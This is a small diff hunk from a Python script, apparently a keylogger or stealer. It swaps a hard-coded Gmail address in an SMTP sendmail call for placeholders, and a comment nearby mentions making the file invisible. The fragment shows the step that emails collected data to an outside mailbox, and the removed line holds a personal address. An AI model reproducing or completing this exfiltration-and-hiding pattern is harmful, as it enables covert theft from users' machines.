@@ -90,7 +90,7 @@ finally:
 
 
     def sendData():
-        server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
+        server.sendmail('sendersEmail', ['hideCopyToSmb'], msg.as_string()) # 1st - sender, 2 - hide copy 
         server.quit()
 
     # setting invisibility of file
